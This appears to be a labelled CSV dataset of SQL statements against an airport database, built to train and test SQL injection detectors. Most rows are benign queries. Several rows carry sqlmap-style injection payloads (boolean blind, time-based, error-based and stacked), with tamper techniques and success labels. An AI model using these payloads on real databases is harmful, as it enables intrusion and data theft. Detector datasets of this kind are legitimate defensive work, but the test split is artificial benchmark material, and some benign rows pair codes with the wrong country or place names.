"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""SX"" GROUP BY r.name ORDER BY r.name ASC;",0,SX,,,,select,airport-S5,,,test
"SELECT id FROM airports WHERE name LIKE ""%Nt4GquMbsYXbezdRpfqi%"" AND continent LIKE ""EU"" AND type IN (""heliport"",""closed"")",0,Nt4GquMbsYXbezdRpfqi EU heliport closed,,,,select,airport-S23,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""6088"" AS SIGNED) AND a.iso_country = ""TL"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,6088 TL,,,,select,airport-S22,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""SHVI"",""small_airport"", ""Yorkton Municipal Airport"",""https://en.wikipedia.org/wiki/Nahanni_Butte_Water_Aerodrome"",""EU"")",0,SHVI small_airport Yorkton Municipal Airport https://en.wikipedia.org/wiki/Nahanni_Butte_Water_Aerodrome EU,,,,insert,airport-I3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 134.5 AND  133.0  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.45  AND  123.5  ORDER BY frequency;",0,134.5 133.0 128.45 123.5,,,,select,airport-S13,,,test
"INSERT INTO countries (code, name, continent) VALUES (""BL"", ""Mayotte"", ""EU"")",0,BL Mayotte EU,,,,insert,airport-I7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""5Q3, 5Q3"") OR name LIKE ""Fazenda Bender, Juazeiro do Norte, CE0077""",0,"5Q3, 5Q3 Fazenda Bender, Juazeiro do Norte, CE0077",,,,select,airport-S10,,,test
"INSERT INTO countries (code, name, continent) VALUES (""VN"", ""Slovenia"", ""EU"")",0,VN Slovenia EU,,,,insert,airport-I7,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""BW"" OR c.name LIKE CONCAT(""%"", ""Seychelles"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,BW Seychelles 2,,,,select,airport-S20,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Sítio Primavera Airport""",0,Sítio Primavera Airport,,,,select,airport-S3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Tizi Ouzou Province"";",0,Tizi Ouzou Province,,,,select,airport-S15,,,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (50106, 20975, ""KTBR"", ""ATIS"", ""GND"", 128.95)",0,50106 20975 KTBR ATIS GND 128.95,,,,insert,airport-I8,,,test
"UPDATE airport_frequencies SET frequency_mhz = 124.8)) as xhUU where 6524=6524 order by 1-- - WHERE type = ""CNTR"";",1, 124.8)) as xhUU where 6524=6524 order by 1-- - CNTR ,recon,lowercase,failure,update,airport-U6,union-86,union,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('KPHH','PH-0292','06PN','IT-0201');",0,KPHH PH-0292 06PN IT-0201,,,,update,airport-U10,,,test
"DELETE FROM airport WHERE name = ""Shilo Heliport"" AND 6371=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 10,1),2,1))>102) THEN 6371 ELSE (SELECT 3839 UNION SELECT 3190) END))-- -"";  ",1," Shilo Heliport"" AND 6371=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 10,1),2,1))>102) THEN 6371 ELSE (SELECT 3839 UNION SELECT 3190) END))-- - ",exploit,sleep2getlock,success,delete,airport-D2,boolean-120,boolean,test
"SELECT * FROM airport WHERE gps_code = ""WN62"" OR local_code = ""4NY0""",0,WN62 4NY0,,,,select,airport-S4,,,train
"DELETE FROM airport WHERE name LIKE ""Juniper Air Park"" OR keywords LIKE ""WRLL, Balikpapan Airport, Sepinggan Airport, Sepinggang Airfield"";  ",0,"Juniper Air Park WRLL, Balikpapan Airport, Sepinggan Airport, Sepinggang Airfield",,,,delete,airport-D3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 126.2 AND  119.055  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  131.6  AND  123.9  ORDER BY frequency;",0,126.2 119.055 131.6 123.9,,,,select,airport-S13,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AI"" GROUP BY r.name ORDER BY r.name ASC;",0,AI,,,,select,airport-S16,,,test
"INSERT INTO countries (code, name, continent) VALUES (""KE||(SELECT 0x574a5971 WHERE 8922=8922 AND (SELECT 8778 FROM (SELECT(GET_LOCK('FIoq',5)))zdbx)#"", ""Jersey"", ""OC"")",1," KE||(SELECT 0x574a5971 WHERE 8922=8922 AND (SELECT 8778 FROM (SELECT(GET_LOCK('FIoq',5)))zdbx)# Jersey OC ",recon,sleep2getlock,success,insert,airport-I7,time-40,time,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (6180, ""9A8"", 3937.0, ""ASP"", 0, 0)",0,6180 9A8 3937.0 ASP 0 0,,,,insert,airport-I9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 10.0 AND 2858.0",0,10.0 2858.0,,,,select,airport-S2,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""KD5"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Caazapá Department"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aéroports du Mali, Malian airports"", ""%"");",0,"KD5 Airports in Caazapá Department Aéroports du Mali, Malian airports",,,,select,airport-S18,,,train
"DELETE FROM airport WHERE name = ""Amsterdam Heliport"";  ",0,Amsterdam Heliport,,,,delete,airport-D2,,,test
SELECT * FROM airport WHERE icao_code = 'WAPI';,0,WAPI,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""LI"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,LI 3,,,,select,airport-S19,,,test
"DELETE FROM airport WHERE name = ""Shilo Heliport"" AND 5469=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 16,1),13,1))>84) THEN 5469 ELSE (SELECT 6631 UNION SELECT 4594) END))-- -"";  ",1," Shilo Heliport"" AND 5469=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x72756e77617973 AND table_schema=0x64617461736574 LIMIT 16,1),13,1))>84) THEN 5469 ELSE (SELECT 6631 UNION SELECT 4594) END))-- - ",exploit,sleep2getlock,success,delete,airport-D2,boolean-120,boolean,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Nova Fátima;""",0,Nova Fátima,,,,select,airport-S21,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""6CA2"", ""small_airport"", ""La Fenice Airfield"", 44.07043, 1.40583, 82.0)",0,6CA2 small_airport La Fenice Airfield 44.07043 1.40583 82.0,,,,insert,airport-I2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 731.0",0,US 731.0,,,,select,airport-S11,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""IT""",0,IT,,,,select,airport-S6,,,test
"SELECT a.name, a.municipality, a.iso_country FROM airport a WHERE a.type IN ('large_airport', 'medium_airport') AND a.iso_country = ""NO""",0,NO,,,,select,airport-S9,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 11512.0 AND 351.0",0,11512.0 351.0,,,,select,airport-S2,,,test
"DELETE FROM runways WHERE airport_ident = ""SVWB"";",0,SVWB,,,,delete,airport-D5,,,test
"UPDATE navaids SET name = ""Carsamba"" WHERE ident = ""KNG"";",0,Carsamba KNG,,,,update,airport-U7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""DJ"" GROUP BY r.name ORDER BY r.name ASC;",0,DJ,,,,select,airport-S16,,,test
"UPDATE airport_frequencies SET description = ""ATIS"" whErE 4498=4498 ANd 1499=(SELect (cAsE wheN (ORd(MId((SELect IFNuLl(casT(COLumN_nAmE As NCHar),0x20) fROM INFORMATION_SCHEMA.cOLuMnS whErE TabLE_naMe=0x72756e77617973 ANd table_schema=0x64617461736574 lImit 15,1),13,1))>96) tHEn 1499 ElSe (SELect 9637 uNioN SELect 7970) ENd))-- -"" WHERE airport_ident = ""DE-0885"";",1," ATIS"" whErE 4498=4498 ANd 1499=(SELect (cAsE wheN (ORd(MId((SELect IFNuLl(casT(COLumN_nAmE As NCHar),0x20) fROM INFORMATION_SCHEMA.cOLuMnS whErE TabLE_naMe=0x72756e77617973 ANd table_schema=0x64617461736574 lImit 15,1),13,1))>96) tHEn 1499 ElSe (SELect 9637 uNioN SELect 7970) ENd))-- - DE-0885 ",exploit,randomcase,success,update,airport-U5,boolean-78,boolean,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4523"" AS SIGNED) AND a.iso_country = ""FO"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4523 FO,,,,select,airport-S22,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""NTKN"";",0,NTKN,,,,select,airport-S7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""PA"" GROUP BY r.name ORDER BY r.name ASC;",0,PA,,,,select,airport-S5,,,test
"UPDATE navaids SET name = ""Corrientes"" WHERE ident = ""KTG"";",0,Corrientes KTG,,,,update,airport-U7,,,test
"DELETE FROM airport WHERE ident=""JY08"";",0,JY08,,,,delete,airport-D1,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SNZF"") OR name LIKE ""PA52, P32, Zaverton""",0,"SNZF PA52, P32, Zaverton",,,,select,airport-S10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""LY"" GROUP BY r.name ORDER BY r.name ASC;",0,LY,,,,select,airport-S16,,,test
"UPDATE airport SET municipality = ""Zapata"" WHERE iso_country = ""BA""",0,Zapata BA,,,,update,airport-U2,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""HT"" GROUP BY r.name ORDER BY r.name ASC;",0,HT,,,,select,airport-S16,,,train
"SELECT * FROM airport WHERE gps_code = ""ORQT"" OR local_code = ""UD21""",0,ORQT UD21,,,,select,airport-S4,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (37161, ""FNSU"", 8193.0, ""G"", 0, 0)",0,37161 FNSU 8193.0 G 0 0,,,,insert,airport-I9,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""US-5237"", ""small_airport"", ""Fazenda Recreio 3 Airport"", 34.94001, -117.15196)",0,US-5237 small_airport Fazenda Recreio 3 Airport 34.94001 -117.15196,,,,insert,airport-I1,,,test
"UPDATE navaids SET name = ""Tanjung Manis"" WHERE ident = ""ZS"";",0,Tanjung Manis ZS,,,,update,airport-U7,,,test
"UPDATE airport SET municipality = ""Woodbridge"" WHERE iso_country = ""CD""",0,Woodbridge CD,,,,update,airport-U2,,,test
"UPDATE airport_frequencies SET frequency_mhz = 122.1 WHERE type = ""ATIS"";",0,122.1 ATIS,,,,update,airport-U6,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""BS"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 2 ORDER BY runway_count DESC, a.name ASC;",0,BS 2,,,,select,airport-S19,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""UA"") OR a.elevation_ft > 925.0",0,UA 925.0,,,,select,airport-S11,,,test
"DELETE FROM runways WHERE airport_ident = ""1XS3"";",0,1XS3,,,,delete,airport-D5,,,test
"DELETE FROM runways WHERE airport_ident = ""PA54"";",0,PA54,,,,delete,airport-D5,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""AQ5"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in North Dakota"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Aéroports du Sénégal, Senegalese airports"", ""%"");",0,"AQ5 Airports in North Dakota Aéroports du Sénégal, Senegalese airports",,,,select,airport-S18,,,test
"UPDATE airport SET municipality = ""Pipe Creek"" WHERE iso_country = ""JP""",0,Pipe Creek JP,,,,update,airport-U2,,,test
"DELETE FROM countries WHERE code = ""TL"";",0,TL,,,,delete,airport-D7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Fiorentino"";",0,Fiorentino,,,,select,airport-S15,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""SM"" OR c.name LIKE CONCAT(""%"", ""Kiribati"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 2 ORDER BY navaid_count DESC;",0,SM Kiribati 2,,,,select,airport-S20,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""UTAT"",""small_airport"", ""Wuhu Wanli Airport / Wuhu Air Base"",""https://en.wikipedia.org/wiki/Taylor_County_Airport_(Kentucky)"",""SA"")",0,UTAT small_airport Wuhu Wanli Airport / Wuhu Air Base https://en.wikipedia.org/wiki/Taylor_County_Airport_(Kentucky) SA,,,,insert,airport-I3,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""TR-70"", ""Lower Shabelle"", ""AF"", ""CA"", ""https://en.wikipedia.org/wiki/Ad_Dakhiliyah_Governorate"", ""Transylvania, Transylvanian Region"")",0,"TR-70 Lower Shabelle AF CA https://en.wikipedia.org/wiki/Ad_Dakhiliyah_Governorate Transylvania, Transylvanian Region",,,,insert,airport-I4,,,test
"DELETE FROM airport WHERE name = ""Prudential Heliport"";  ",0,Prudential Heliport,,,,delete,airport-D2,,,train
"DELETE FROM airport WHERE name LIKE ""Schumacher Heliport"" OR keywords LIKE ""FW4"";  ",0,Schumacher Heliport FW4,,,,delete,airport-D3,,,test
SELECT * FROM airport WHERE icao_code = 'FNSU';,0,FNSU,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""3339"" AS SIGNED) AND a.iso_country = ""MU"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,3339 MU,,,,select,airport-S22,,,test
"DELETE FROM airport_frequencies WHERE type = ""UNIC"";",0,UNIC,,,,delete,airport-D4,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""RU-AMU"", ""TE"", ""Iwate Prefecture"", ""AS]-(SELECT
0WHERE3905=3905;SELECTBENCHMARK(5000000,MD5(0x69585a52)))|[AS"", ""VE"")",1," RU-AMU TE Iwate Prefecture AS]-(SELECT
0WHERE3905=3905;SELECTBENCHMARK(5000000,MD5(0x69585a52)))|[AS VE ",recon,space2mysqlblank,failure,insert,airport-I5,stacked-27,stacked,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Hobas Airport""",0,Hobas Airport,,,,select,airport-S3,,,test
"UPDATE airport SET home_link = ""https://canmore.alpinehelicopter.com/"" WHERE name = ""Covey Hill Airport""",0,https://canmore.alpinehelicopter.com/ Covey Hill Airport,,,,update,airport-U4,,,test
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 297.0 AND 130.0",0,297.0 130.0,,,,select,airport-S2,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Saint-Paul Arrondissement"";",0,Saint-Paul Arrondissement,,,,select,airport-S15,,,train
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""WIBI"";",0,WIBI,,,,select,airport-S7,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""CO23"") OR name LIKE ""1XA0""",0,CO23 1XA0,,,,select,airport-S10,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PN"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,PN 3,,,,select,airport-S19,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (85243, ""ALP"", ""Mora"", ""NDB"", 293, ""MX"")",0,85243 ALP Mora NDB 293 MX,,,,insert,airport-I10,,,test
"DELETE FROM airport WHERE name LIKE ""Southend Farm Heliport"" OR keywords LIKE ""SWYP"";  ",0,Southend Farm Heliport SWYP,,,,delete,airport-D3,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""RU-KAM""",0,SA RU-KAM,,,,select,airport-S8,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""6R4, Bird's Nest"") OR name LIKE ""Daeseok-ri""",0,"6R4, Bird's Nest Daeseok-ri",,,,select,airport-S10,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Middle Bass Island;""",0,Middle Bass Island,,,,select,airport-S21,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""MN-035"", ""MB))   AS    IHya     WHERE   6675=6675; SELECT    BENCHMARK(5000000,MD5(0x695a5546))#"", ""Pingtung County"", ""AS"", ""OM"")",1," MN-035 MB))   AS    IHya     WHERE   6675=6675; SELECT    BENCHMARK(5000000,MD5(0x695a5546))# Pingtung County AS OM ",recon,multiplespaces,failure,insert,airport-I5,stacked-27,stacked,test
"INSERT INTO airport_frequencies (id, airport_ref, airport_ident, type, description, frequency_mhz) VALUES (56717, 2771, ""CAM4"", ""ATIS"", ""NORCAL APP/DEP""))) OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(1182 LIKE 1182,1))),0x7171717171,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((""RdIp"" LIKE ""RdIp"", 126.0)",1," 56717 2771 ""CAM4"" ""ATIS"" ""NORCAL APP/DEP""    OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71717a6271,(SELECT (ELT(1182 LIKE 1182,1   ,0x7171717171,0x78  s  8446744073709551610 8446744073709551610    AND (((""RdIp"" LIKE ""RdIp"" 126.0 ",recon,equaltolike,success,insert,airport-I8,error-43,error,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 863.0",0,US 863.0,,,,select,airport-S11,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""RO-BH"", ""Cankuzo Province"", ""AS"", ""FI"", ""https://en.wikipedia.org/wiki/Diyala_Governorate"", ""Airports in Potaro-Siparuni"" and ELT(6648=8901,8901) and ""QJmr"" like ""QJmr"")",1," RO-BH Cankuzo Province AS FI https://en.wikipedia.org/wiki/Diyala_Governorate Airports in Potaro-Siparuni"" and ELT(6648=8901,8901) and ""QJmr"" like ""QJmr ",recon,lowercase,success,insert,airport-I4,boolean-18,boolean,test
"UPDATE navaids SET name = ""Upernavik"" WHERE ident = ""CAV"";",0,Upernavik CAV,,,,update,airport-U7,,,test
"UPDATE countries SET keywords = ""Airports in Madagascar"" WHERE code = ""US"";",0,Airports in Madagascar US,,,,update,airport-U8,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""NR-07"", ""MW"", ""Nurestan Province"", ""AS"", ""BS"")",0,NR-07 MW Nurestan Province AS BS,,,,insert,airport-I5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""SX"", ""Norfolk Island"", ""AS"", ""Guyanese airports"")",0,SX Norfolk Island AS Guyanese airports,,,,insert,airport-I6,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (1558, ""PS04"", 2756.0, ""CON"", 0, 0)",0,1558 PS04 2756.0 CON 0 0,,,,insert,airport-I9,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-11254"";",0,US-11254,,,,select,airport-S7,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""CA"" GROUP BY r.name ORDER BY r.name ASC;",0,CA,,,,select,airport-S16,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Cassia;""",0,Cassia,,,,select,airport-S21,,,test
"UPDATE navaids SET name = ""San Nicolas Island"" WHERE ident = ""JUJ"";",0,San Nicolas Island JUJ,,,,update,airport-U7,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""West Grand Bahama"";",0,West Grand Bahama,,,,select,airport-S15,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""CN-0345"", ""heliport"", ""Arad Airport"", 29.928028, -43.216485, 633.0)",0,CN-0345 heliport Arad Airport 29.928028 -43.216485 633.0,,,,insert,airport-I2,,,test
"UPDATE airport SET name = ""Shangrao Sanqingshan Airport"" wHere 1550=1550 ANd gTiD_sUbsEt(ConcaT(0x7178786b71,(SElECT miD((ifNulL(CaST(column_type aS NchAR),0x20)),1,190) frOM INFORMATION_SCHEMA.COlUMNs wHere TABlE_namE=0x6e617661696473 ANd table_schema=0x64617461736574 LiMIT 5,1),0x717a707071),4654)-- DPaE"" WHERE ident = ""21VA""",1," Shangrao Sanqingshan Airport  wHere 1550=1550 ANd gTiD_sUbsEt(ConcaT(0x7178786b71,(SElECT miD((ifNulL(CaST(column_type aS NchAR),0x20)),1,190) frOM INFORMATION_SCHEMA.COlUMNs wHere TABlE_namE=0x6e617661696473 ANd table_schema=0x64617461736574 LiMIT 5,1),0x717a707071),4654)-- DPaE 21VA ",exploit,randomcase,success,update,airport-U1,error-61,error,test
"UPDATE airport SET wikipedia_link = ""https://en.wikipedia.org/wiki/Bandon_State_Airport"" WHERE ident = ""KCNM""",0,https://en.wikipedia.org/wiki/Bandon_State_Airport KCNM,,,,update,airport-U3,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""ZA-0340"";",0,ZA-0340,,,,select,airport-S7,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""San José Airport""",0,San José Airport,,,,select,airport-S3,,,test
"UPDATE countries SET keywords = ""Aeropuertos de Perú"" WHERE code = ""SG"";",0,Aeropuertos de Perú SG,,,,update,airport-U8,,,test
"SELECT * FROM airport WHERE continent = ""EU"" AND iso_region LIKE ""BR-RJ""",0,EU BR-RJ,,,,select,airport-S8,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (94989, ""ROS"", ""Lincoln"", ""NDB"", 116300, ""IR"")",0,94989 ROS Lincoln NDB 116300 IR,,,,insert,airport-I10,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""IL"" GROUP BY r.name ORDER BY r.name ASC;",0,IL,,,,select,airport-S5,,,train
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""FM"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 5 ORDER BY runway_count DESC, a.name ASC;",0,FM 5,,,,select,airport-S19,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""JP-2385"", ""closed"", ""İzmir City Hospital Heliport"", 35.458718, 6.721771, 781.0)",0,JP-2385 closed İzmir City Hospital Heliport 35.458718 6.721771 781.0,,,,insert,airport-I2,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('0WA9','BGUQ','VA35','FAAE');",0,0WA9 BGUQ VA35 FAAE,,,,update,airport-U10,,,test
"INSERT INTO navaids (id, ident, name, type, frequency_khz, iso_country) VALUES (87972, ""MG"", ""Monrovia Roberts"", ""NDB"", 110600, ""SN"")",0,87972 MG Monrovia Roberts NDB 110600 SN,,,,insert,airport-I10,,,test
"INSERT INTO countries (code, name, continent) VALUES (""ZM"", ""Thailand"", ""AF"")",0,ZM Thailand AF,,,,insert,airport-I7,,,test
"SELECT id, ident, name FROM airport WHERE iso_country = ""AR""",0,AR,,,,select,airport-S6,,,test
"SELECT name, 'airport' AS type FROM airport WHERE keywords LIKE CONCAT(""%"",  ""33PN"", ""%"") UNION SELECT name, 'region' FROM regions WHERE keywords LIKE CONCAT(""%"", ""VEVZ, Visakhapatnam, Vizag"", ""%"") UNION SELECT name, 'country' FROM countries WHERE keywords LIKE CONCAT(""%"", ""Lockhart-Cape Ranch"", ""%"");",0,"33PN VEVZ, Visakhapatnam, Vizag Lockhart-Cape Ranch",,,,select,airport-S17,,,test
SELECT * FROM airport WHERE icao_code = 'CYYG';,0,CYYG,,,,select,airport-S1,,,test
"DELETE FROM airport WHERE ident=""UA-0174"";",0,UA-0174,,,,delete,airport-D1,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""SPBA, SPBA"") OR name LIKE ""LF0952, LF0952""",0,"SPBA, SPBA LF0952, LF0952",,,,select,airport-S10,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""HU-0061"", ""heliport"", ""Mushie Airport"", 35.768348, 75.84559631350001, 470.0)",0,HU-0061 heliport Mushie Airport 35.768348 75.84559631350001 470.0,,,,insert,airport-I2,,,test
"DELETE FROM regions WHERE name = ""Guangxi Autonomous Region"";",0,Guangxi Autonomous Region,,,,delete,airport-D8,,,test
